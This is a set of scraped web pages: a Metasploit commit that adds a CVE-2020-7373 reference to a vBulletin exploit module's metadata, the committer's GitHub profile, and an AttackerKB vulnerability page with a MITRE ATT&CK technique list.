* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

## Commit

[Permalink](/rapid7/metasploit-framework/commit/19618d9bd259c0f9d3b28b53b0ba41a71420430a)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Add [CVE-2020-7373](https://github.com/advisories/GHSA-mvwh-2m72-5jm7 "CVE-2020-7373") in the references

[Browse files](/rapid7/metasploit-framework/tree/19618d9bd259c0f9d3b28b53b0ba41a71420430a)
Browse the repository at this point in the history

* Loading branch information

Tod Beardsley
authored
Aug 11, 2020

1 parent
[0dab52e](/rapid7/metasploit-framework/commit/0dab52ef350f68cd935a850227d72c335bb54948)

commit 19618d9

Showing
**1 changed file**
with
**2 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

3 changes: 2 additions & 1 deletion

3
[modules/exploits/multi/http/vbulletin\_widget\_template\_rce.rb](#diff-8c58895463fe35333e2fba020df61c9a5f44344c9a99c0225261bfda780a77a2 "modules/exploits/multi/http/vbulletin_widget_template_rce.rb")

Show comments

[View file](/rapid7/metasploit-framework/blob/19618d9bd259c0f9d3b28b53b0ba41a71420430a/modules/exploits/multi/http/vbulletin_widget_template_rce.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -27,7 +27,8 @@ def initialize(info = {}) |
|  |  | 'Zenofex <zenofex[at]exploitee.rs>' # (@zenofex) PoC and Metasploit module |
|  |  | ], |
|  |  | 'References' => [ |
|  |  | ['URL', 'https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/'] |
|  |  | ['URL', 'https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/'], |
|  |  | ['CVE', '2020-7373'] |
|  |  | ], |
|  |  | 'DisclosureDate' => '2020-08-09', |
|  |  | 'License' => MSF\_LICENSE, |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `19618d9`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fcommit%2F19618d9bd259c0f9d3b28b53b0ba41a71420430a) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_0ff0a581_20250119_141607.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=64&v=4)

**todb-r7**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

[Overview](/todb-r7)
[Repositories
82](/todb-r7?tab=repositories)
[Projects
0](/todb-r7?tab=projects)
[Packages
0](/todb-r7?tab=packages)
[Stars
20](/todb-r7?tab=stars)

More

* [Overview](/todb-r7)
* [Repositories](/todb-r7?tab=repositories)
* [Projects](/todb-r7?tab=projects)
* [Packages](/todb-r7?tab=packages)
* [Stars](/todb-r7?tab=stars)

![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=64&v=4)

**todb-r7**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

[![View todb-r7's full-sized avatar](https://avatars.githubusercontent.com/u/1170909?v=4)](https://avatars.githubusercontent.com/u/1170909?v=4)

# Tod Beardsley todb-r7

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftodb-r7)

A more real version of my GitHub presence is over at [@todb](https://github.com/todb). This was my Rapid7-specific account.
[256
followers](https://github.com/todb-r7?tab=followers) · [3
following](https://github.com/todb-r7?tab=following)

* [@rapid7](https://github.com/rapid7)
* [https://infosec.exchange/@todb](https://infosec.exchange/%40todb)
* X
  [@todb](https://twitter.com/todb)

## [Achievements](/todb-r7?tab=achievements)

[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/todb-r7?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/todb-r7?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/todb-r7?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x3](/todb-r7?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x3](/todb-r7?achievement=pull-shark&tab=achievements)
## [Achievements](/todb-r7?tab=achievements)

[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/todb-r7?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/todb-r7?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/todb-r7?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)x3](/todb-r7?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x3](/todb-r7?achievement=pull-shark&tab=achievements)

Block or Report

# Block or report todb-r7

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user’s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=todb-r7+%28user%29)

[Overview](/todb-r7)
[Repositories
82](/todb-r7?tab=repositories)
[Projects
0](/todb-r7?tab=projects)
[Packages
0](/todb-r7?tab=packages)
[Stars
20](/todb-r7?tab=stars)

More

* [Overview](/todb-r7)
* [Repositories](/todb-r7?tab=repositories)
* [Projects](/todb-r7?tab=projects)
* [Packages](/todb-r7?tab=packages)
* [Stars](/todb-r7?tab=stars)

## Popular repositories Loading

1. [git-completion.bash](/todb-r7/git-completion.bash) git-completion.bash
   Public

   git-completion.bash - autocomplete for bash/zsh

   Shell

   [10](/todb-r7/git-completion.bash/stargazers)
   [10](/todb-r7/git-completion.bash/forks)
2. [eicar](/todb-r7/eicar) eicar
   Public

   EICAR test string, to validate anti-virus detection functionality

   Ruby

   [3](/todb-r7/eicar/stargazers)
   [1](/todb-r7/eicar/forks)
3. [msflint](/todb-r7/msflint) msflint
   Public

   Forked from [h0ng10/msflint](/h0ng10/msflint)

   A lint tool for the metasploit framework

   Ruby

   [2](/todb-r7/msflint/stargazers)
4. [junkdrawer](/todb-r7/junkdrawer) junkdrawer
   Public

   Forked from [todb/junkdrawer](/todb/junkdrawer)

   Silly scripts for small tasks.

   Ruby

   [2](/todb-r7/junkdrawer/stargazers)
   [3](/todb-r7/junkdrawer/forks)
5. [sshkey](/todb-r7/sshkey) sshkey
   Public

   Forked from [bensie/sshkey](/bensie/sshkey)

   SSH private and public key generator in pure Ruby (RSA & DSA)

   Ruby

   [1](/todb-r7/sshkey/stargazers)
6. [simple-network-tools](/todb-r7/simple-network-tools) simple-network-tools
   Public

   Forked from [pentestify/simple\_network\_tools](/pentestify/simple_network_tools)

   Ruby

   [1](/todb-r7/simple-network-tools/stargazers)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from attackerkb.com_e4ee1808_20250119_141609.html ===


[![](/static/public/img/logo-condensed-dark.png)
![](/static/public/img/logo-dark.png)
A Rapid7 Project](/)

* [Activity Feed](/activity-feed)
* [Topics](/topics)
* [About](/about)
* [Leaderboard](/leaderboard)

[Log In](/login)

![](/static/private/img/attacker-value/dark/attacker-value-4.svg)

Attacker Value
##### High

1

### CVE-2020-7373

1

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

##### Advisory

Description:
URL:

Add Another

##### Exploit

Description:
URL:

Add Another

##### Mitigation

Description:
URL:

Add Another

##### Related AttackerKB Topic

Description:
URL:

Add Another

##### Government or Industry Alert

Description:
URL:

Add Another

##### Miscellaneous

Description:
URL:

Add Another

Cancel
Submit

![](/static/private/img/attacker-value/dark/attacker-value-4.svg)

Attacker Value
###### High

(1 user assessed)

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Exploitability
###### Very High

(1 user assessed)

User Interaction
###### [None](/search?userInteraction=NONE)

Privileges Required
###### [None](/search?privilegesRequired=NONE)

Attack Vector
###### [Network](/search?attackVector=NETWORK)

1

# CVE-2020-7373

Disclosure Date: October 30, 2020
•
(Last updated November 28, 2024) ▾

[CVE-2020-7373](/search?q=CVE-2020-7373)
CVSS v3 Base Score:
9.8

Report As Exploited in the Wild

MITRE ATT&CK[Log in to add MITRE ATT&CK tag](/login)
Add MITRE ATT&CK tactics and techniques that apply to this CVE.

### MITRE ATT&CK

Select the MITRE ATT&CK Tactics that apply to this CVE

Initial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral MovementCollectionExfiltrationCommand and ControlImpact

##### Collection

Select any Techniques used:

Data from Local System

Data from Removable Media

Data from Network Shared Drive

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Data Staged

Data Staged: Local Data Staging

Data Staged: Remote Data Staging

Screen Capture

Email Collection

Email Collection: Local Email Collection

Email Collection: Remote Email Collection

Email Collection: Email Forwarding Rule

Clipboard Data

Automated Collection

Audio Capture

Video Capture

Man in the Browser

Data from Information Repositories

Data from Information Repositories: Confluence

Data from Information Repositories: Sharepoint

Data from Cloud Storage Object

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Archive Collected Data

Archive Collected Data: Archive via Utility

Archive Collected Data: Archive via Library

Archive Collected Data: Archive via Custom Method

##### Command and Control

Select any Techniques used:

Data Obfuscation

Data Obfuscation: Junk Data

Data Obfuscation: Steganography

Data Obfuscation: Protocol Impersonation

Fallback Channels

Application Layer Protocol

Application Layer Protocol: Web Protocols

Application Layer Protocol: File Transfer Protocols

Application Layer Protocol: Mail Protocols

Application Layer Protocol: DNS

Proxy

Proxy: Internal Proxy

Proxy: External Proxy

Proxy: Multi-hop Proxy

Proxy: Domain Fronting

Communication Through Removable Media

Non-Application Layer Protocol

Web Service

Web Service: Dead Drop Resolver

Web Service: Bidirectional Communication

Web Service: One-Way Communication

Multi-Stage Channels

Ingress Tool Transfer

Data Encoding

Data Encoding: Standard Encoding

Data Encoding: Non-Standard Encoding

Traffic Signaling

Traffic Signaling: Port Knocking

Remote Access Software

Dynamic Resolution

Dynamic Resolution: Fast Flux DNS

Dynamic Resolution: Domain Generation Algorithms

Dynamic Resolution: DNS Calculation

Non-Standard Port

Protocol Tunneling

Encrypted Channel

Encrypted Channel: Symmetric Cryptography

Encrypted Channel: Asymmetric Cryptography

##### Credential Access

Select any Techniques used:

OS Credential Dumping

OS Credential Dumping: LSASS Memory

OS Credential Dumping: Security Account Manager

OS Credential Dumping: NTDS

OS Credential Dumping: LSA Secrets

OS Credential Dumping: Cached Domain Credentials

OS Credential Dumping: DCSync

OS Credential Dumping: Proc Filesystem

OS Credential Dumping: /etc/passwd and /etc/shadow

Network Sniffing

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Brute Force

Brute Force: Password Guessing

Brute Force: Password Cracking

Brute Force: Password Spraying

Brute Force: Credential Stuffing

Two-Factor Authentication Interception

Forced Authentication

Exploitation for Credential Access

Steal Application Access Token

Steal Web Session Cookie

Unsecured Credentials

Unsecured Credentials: Credentials In Files

Unsecured Credentials: Credentials in Registry

Unsecured Credentials: Bash History

Unsecured Credentials: Private Keys

Unsecured Credentials: Cloud Instance Metadata API

Unsecured Credentials: Group Policy Preferences

Credentials from Password Stores

Credentials from Password Stores: Keychain

Credentials from Password Stores: Securityd Memory

Credentials from Password Stores: Credentials from Web Browsers

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Steal or Forge Kerberos Tickets

Steal or Forge Kerberos Tickets: Golden Ticket

Steal or Forge Kerberos Tickets: Silver Ticket

Steal or Forge Kerberos Tickets: Kerberoasting

##### Defense Evasion

Select any Techniques used:

Direct Volume Access

Rootkit

Obfuscated Files or Information

Obfuscated Files or Information: Binary Padding

Obfuscated Files or Information: Software Packing

Obfuscated Files or Information: Steganography

Obfuscated Files or Information: Compile After Delivery

Obfuscated Files or Information: Indicator Removal from Tools

Masquerading

Masquerading: Invalid Code Signature

Masquerading: Right-to-Left Override

Masquerading: Rename System Utilities

Masquerading: Masquerade Task or Service

Masquerading: Match Legitimate Name or Location

Masquerading: Space after Filename

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Indicator Removal on Host

Indicator Removal on Host: Clear Windows Event Logs

Indicator Removal on Host: Clear Linux or Mac System Logs

Indicator Removal on Host: Clear Command History

Indicator Removal on Host: File Deletion

Indicator Removal on Host: Network Share Connection Removal

Indicator Removal on Host: Timestomp

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Modify Registry

Trusted Developer Utilities Proxy Execution

Trusted Developer Utilities Proxy Execution: MSBuild

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Deobfuscate/Decode Files or Information

BITS Jobs

Indirect Command Execution

Traffic Signaling

Traffic Signaling: Port Knocking

Rogue Domain Controller

Exploitation for Defense Evasion

Signed Script Proxy Execution

Signed Script Proxy Execution: PubPrn

Signed Binary Proxy Execution

Signed Binary Proxy Execution: Compiled HTML File

Signed Binary Proxy Execution: Control Panel

Signed Binary Proxy Execution: CMSTP

Signed Binary Proxy Execution: InstallUtil

Signed Binary Proxy Execution: Mshta

Signed Binary Proxy Execution: Msiexec

Signed Binary Proxy Execution: Odbcconf

Signed Binary Proxy Execution: Regsvcs/Regasm

Signed Binary Proxy Execution: Regsvr32

Signed Binary Proxy Execution: Rundll32

XSL Script Processing

Template Injection

File and Directory Permissions Modification

File and Directory Permissions Modification: Windows File and Directory Permissions Modification

File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

Execution Guardrails

Execution Guardrails: Environmental Keying

Group Policy Modification

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Unused/Unsupported Cloud Regions

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Subvert Trust Controls

Subvert Trust Controls: Gatekeeper Bypass

Subvert Trust Controls: Code Signing

Subvert Trust Controls: SIP and Trust Provider Hijacking

Subvert Trust Controls: Install Root Certificate

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Impair Defenses

Impair Defenses: Disable or Modify Tools

Impair Defenses: Disable Windows Event Logging

Impair Defenses: HISTCONTROL

Impair Defenses: Disable or Modify System Firewall

Impair Defenses: Indicator Blocking

Impair Defenses: Disable or Modify Cloud Firewall

Hide Artifacts

Hide Artifacts: Hidden Files and Directories

Hide Artifacts: Hidden Users

Hide Artifacts: Hidden Window

Hide Artifacts: NTFS File Attributes

Hide Artifacts: Hidden File System

Hide Artifacts: Run Virtual Instance

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Modify Cloud Compute Infrastructure

Modify Cloud Compute Infrastructure: Create Snapshot

Modify Cloud Compute Infrastructure: Create Cloud Instance

Modify Cloud Compute Infrastructure: Delete Cloud Instance

Modify Cloud Compute Infrastructure: Revert Cloud Instance

##### Discovery

Select any Techniques used:

System Service Discovery

Application Window Discovery

Query Registry

System Network Configuration Discovery

Remote System Discovery

System Owner/User Discovery

Network Sniffing

Network Service Scanning

System Network Connections Discovery

Process Discovery

Permission Groups Discovery

Permission Groups Discovery: Local Groups

Permission Groups Discovery: Domain Groups

Permission Groups Discovery: Cloud Groups

System Information Discovery

File and Directory Discovery

Account Discovery

Account Discovery: Local Account

Account Discovery: Domain Account

Account Discovery: Email Account

Account Discovery: Cloud Account

Peripheral Device Discovery

System Time Discovery

Network Share Discovery

Password Policy Discovery

Browser Bookmark Discovery

Domain Trust Discovery

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Software Discovery

Software Discovery: Security Software Discovery

Cloud Service Discovery

Cloud Service Dashboard

##### Execution

Select any Techniques used:

Windows Management Instrumentation

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Command and Scripting Interpreter

Command and Scripting Interpreter: PowerShell

Command and Scripting Interpreter: AppleScript

Command and Scripting Interpreter: Windows Command Shell

Command and Scripting Interpreter: Unix Shell

Command and Scripting Interpreter: Visual Basic

Command and Scripting Interpreter: Python

Command and Scripting Interpreter: JavaScript/JScript

Software Deployment Tools

Native API

Shared Modules

Exploitation for Client Execution

User Execution

User Execution: Malicious Link

User Execution: Malicious File

Inter-Process Communication

Inter-Process Communication: Component Object Model

Inter-Process Communication: Dynamic Data Exchange

System Services

System Services: Launchctl

System Services: Service Execution

##### Exfiltration

Select any Techniques used:

Exfiltration Over Other Network Medium

Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth

Automated Exfiltration

Scheduled Transfer

Data Transfer Size Limits

Exfiltration Over C2 Channel

Exfiltration Over Alternative Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

Exfiltration Over Physical Medium

Exfiltration Over Physical Medium: Exfiltration over USB

Transfer Data to Cloud Account

Exfiltration Over Web Service

Exfiltration Over Web Service: Exfiltration to Code Repository

Exfiltration Over Web Service: Exfiltration to Cloud Storage

##### Impact

Select any Techniques used:

Data Destruction

Data Encrypted for Impact

Service Stop

Inhibit System Recovery

Defacement

Defacement: Internal Defacement

Defacement: External Defacement

Firmware Corruption

Resource Hijacking

Network Denial of Service

Network Denial of Service: Direct Network Flood

Network Denial of Service: Reflection Amplification

Endpoint Denial of Service

Endpoint Denial of Service: OS Exhaustion Flood

Endpoint Denial of Service: Service Exhaustion Flood

Endpoint Denial of Service: Application Exhaustion Flood

Endpoint Denial of Service: Application or System Exploitation

System Shutdown/Reboot

Account Access Removal

Disk Wipe

Disk Wipe: Disk Content Wipe

Disk Wipe: Disk Structure Wipe

Data Manipulation

Data Manipulation: Stored Data Manipulation

Data Manipulation: Transmitted Data Manipulation

Data Manipulation: Runtime Data Manipulation

##### Initial Access

Select any Techniques used:

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Replication Through Removable Media

External Remote Services

Drive-by Compromise

Exploit Public-Facing Application

Supply Chain Compromise

Supply Chain Compromise: Compromise Software Dependencies and Development Tools

Supply Chain Compromise: Compromise Software Supply Chain

Supply Chain Compromise: Compromise Hardware Supply Chain

Trusted Relationship

Hardware Additions

Phishing

Phishing: Spearphishing Attachment

Phishing: Spearphishing Link

Phishing: Spearphishing via Service

##### Lateral Movement

Select any Techniques used:

Remote Services

Remote Services: Remote Desktop Protocol

Remote Services: SMB/Windows Admin Shares

Remote Services: Distributed Component Object Model

Remote Services: SSH

Remote Services: VNC

Remote Services: Windows Remote Management

Software Deployment Tools

Taint Shared Content

Replication Through Removable Media

Exploitation of Remote Services

Internal Spearphishing

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Remote Service Session Hijacking

Remote Service Session Hijacking: SSH Hijacking

Remote Service Session Hijacking: RDP Hijacking

Lateral Tool Transfer

##### Persistence

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Account Manipulation

Account Manipulation: Additional Azure Service Principal Credentials

Account Manipulation: Exchange Email Delegate Permissions

Account Manipulation: Add Office 365 Global Administrator Role

Account Manipulation: SSH Authorized Keys

External Remote Services

Create Account

Create Account: Local Account

Create Account: Domain Account

Create Account: Cloud Account

Office Application Startup

Office Application Startup: Office Template Macros

Office Application Startup: Office Test

Office Application Startup: Outlook Forms

Office Application Startup: Outlook Home Page

Office Application Startup: Outlook Rules

Office Application Startup: Add-ins

Browser Extensions

BITS Jobs

Traffic Signaling

Traffic Signaling: Port Knocking

Server Software Component

Server Software Component: SQL Stored Procedures

Server Software Component: Transport Agent

Server Software Component: Web Shell

Implant Container Image

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Compromise Client Software Binary

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

